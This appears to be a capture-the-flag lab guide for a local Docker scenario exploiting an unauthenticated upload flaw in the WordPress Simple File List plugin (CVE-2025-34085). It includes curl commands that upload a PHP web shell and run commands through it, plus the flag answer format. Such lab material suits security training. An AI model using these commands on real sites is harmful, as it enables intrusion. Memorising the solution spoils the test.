# WEB-03: WordPress Simple File List RCE

## 场景信息

| 字段 | 值 |
|---|---|
| ID | WEB-03 |
| 名称 | WordPress Simple File List RCE |
| 技术/CVE | CVE-2025-34085 |
| 难度 | L1 |
| 交付方式 | Docker Compose |
| 入口 | localhost:10103 |

## 场景概述
- 技术：CVE-2025-34085
- 难度：L1
- 交付方式：docker
- 入口端口：10103
## 攻击路径与利用步骤

### Overview
| Property | Value |
|----------|-------|
| CVE | CVE-2025-34085 (CVSS 10.0) |
| Difficulty | L1 |
| Port | 10103 |
| Plugin | simple-file-list 4.2.2 |

### Attack Path
```
Unauthenticated file upload → PHP webshell → RCE → /flag.txt
```

### Step-by-Step

```bash
# Upload PHP file via plugin's unauthenticated endpoint
curl -X POST http://localhost:10103/wp-content/plugins/simple-file-list/ee-upload-engine.php \
  -F "file=@shell.php"

# Access uploaded shell
curl "http://localhost:10103/wp-content/uploads/simple-file-list/shell.php?c=cat+/flag.txt"
# flag{web-03-xxxxxxxxxxxxxxxx}
```

## 此场景利用了哪些知识

| 规划维度 | 所需知识 |
|---|---|
| 环境与访问 | WordPress plugin upload endpoint and multipart/form-data |
| 侦察与前置条件 | Unauthenticated Simple File List upload handler discovery |
| 核心漏洞与利用 | Upload a PHP payload through the plugin endpoint |
| 权限、横向或影响 | PHP web-shell command execution |
| 验证 | Request the uploaded payload to read the flag |

## 修复建议
升级或修复对应组件，移除导致攻击路径的非必要权限、网络暴露或不安全默认配置，并在修复后复测本指南中的利用步骤。

## Flag

完成上述利用后，读取场景返回的 `flag{...}` 值；可用 `scripts/verify-flag.sh` 验证捕获结果。
